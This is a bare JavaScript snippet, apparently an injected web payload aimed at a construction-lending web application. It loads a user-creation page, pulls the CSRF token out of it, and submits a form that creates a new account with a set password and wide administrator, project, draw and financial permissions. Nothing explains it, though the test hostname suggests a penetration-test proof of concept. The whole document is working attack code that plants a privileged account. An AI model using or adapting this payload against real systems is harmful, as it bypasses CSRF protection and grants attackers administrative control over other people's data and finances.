fetch('/user_add.php')
  .then(function(r){ return r.text(); })
  .then(function(html){
    var parser = new DOMParser();
    var doc = parser.parseFromString(html, 'text/html');
    var csrf = doc.querySelector('input[name="csrf_token"]').value;
    fetch('/user_add.php', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': 'https://constructtest.abrigo.com'
      },
      body: 'csrf_token=' + csrf + '&uAllowLogin=Y&uEmail=hh%40houdini.com&uPassraw=TestPassword%40123&uFname=Harry&uLname=Houdini&uCompanyName=&uAddress=&uCity=&uState=&uZip=&uZip4=&uCellPhone1=&uCellPhone2=&uCellPhone3=&uCellCarrierID=1&uPhoneAlt1=&uPhoneAlt2=&uPhoneAlt3=&uBranchID=404&uRegionID=&uRoleck0=5%3ABE%3A1%3A&uRoleck6=13%3AAR%3A19%3A&uReportsTo=11149&shareid=&uShareProjects=&frmupUserAdmin=a&frmupUserAdminType=a&frmuppgBorn=on&frmuppgBldn=on&frmuppgInspectorsn=on&frmupViewAllProjs=y&frmupViewAllProjBrnReg=v&frmupFinancials=v&frmuppgTemp=a&frmuppgRetainage=a&frmuppgImp=a&frmuppgExpPay=a&frmuppgDash=v&frmuppgPrjM=a&frmuppgPrjDel=a&frmuppgDraw=&frmuppgInsp=&frmuppgBld=&frmuppgBor=&frmuppgPaydown=&frmuppgPaysubs=&frmuppgDocPa=on&frmuppgDrawa=on&frmuppgDrawActA=a&frmuppgDrawActD=a&frmuppgDrawActFA=a&frmuppgDrawActFD=a&frmuppgDrawActSE=a&frmuppgInspa=on&frmuppgPaydowna=on&frmuppgPaysubsa=on&uBuilderRCInd=&uBankreviewapprexpdate=&uVLiabilityinsurexpdate=&uVLicenseexpdate=&uVCompexpdate=&uInspectorType=&uTrainingInd=N&uAggregateDebt=&uFundAcctBankName=&uFundAcctNumber=&uFundAcctNameonAcct=&uFundAcctABANumber=&uTaxClassificationID=7&uTaxID=&uW9OnFile=N&u1099Eligible=-1&uNotes=&uLastModifiedBy=11263&uLastModified=2026-05-28+16%3A37%3A58&uAcctCreatedDate=2026-05-28'
    });
  });
